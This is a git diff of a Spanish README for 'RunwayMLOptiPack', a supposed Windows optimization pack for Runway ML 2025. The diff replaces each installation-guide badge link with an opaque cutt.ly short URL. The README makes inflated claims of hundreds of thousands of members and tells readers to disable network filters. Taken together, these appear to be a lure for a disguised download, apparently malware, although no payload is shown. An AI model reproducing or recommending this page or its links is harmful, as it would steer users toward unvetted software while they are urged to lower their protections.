@@ -6,7 +6,7 @@
 
 **Acerca de RunwayMLOptiPack**: RunwayMLOptiPack es un repositorio para usuarios de *Runway ML 2025* en Windows, con herramientas y configuraciones comunitarias para optimizar flujos de trabajo de IA generativa para creación de video, imagen y audio. Mejora el rendimiento, reduce tiempos de procesamiento y potencia resultados creativos para una experiencia fluida. ¡Con 300K+ visitantes y 250K+ miembros, eleva tus proyectos de IA hoy!
 
- <a href="https://runway-ml-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/7rNrBmNB" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Ahora-3498db" alt="Guía de Instalación" width="400" height="75" style="border:none;">
 </a>
 
@@ -22,7 +22,7 @@ Mejora tu *Runway ML 2025* con **RunwayMLOptiPack** en Windows:
 2. **Soluciona Problemas de Acceso** 🌐  
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
- <a href="https://runway-ml-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/7rNrBmNB" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Ahora-3498db" alt="Guía de Instalación" width="400" height="75" style="border:none;">
 </a>
 
@@ -35,7 +35,7 @@ Mejora tu *Runway ML 2025* con **RunwayMLOptiPack** en Windows:
 - 🤝 **Comunidad Activa**: Conecta con 250K+ miembros.  
 - 📅 **Actualizaciones Frecuentes**: Nuevas herramientas para tus proyectos.
 
- <a href="https://runway-ml-opti-comunidad.github.io/.github/" target="_blank">
+ <a href="https://cutt.ly/7rNrBmNB" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Ahora-3498db" alt="Guía de Instalación" width="400" height="75" style="border:none;">
 </a>
 
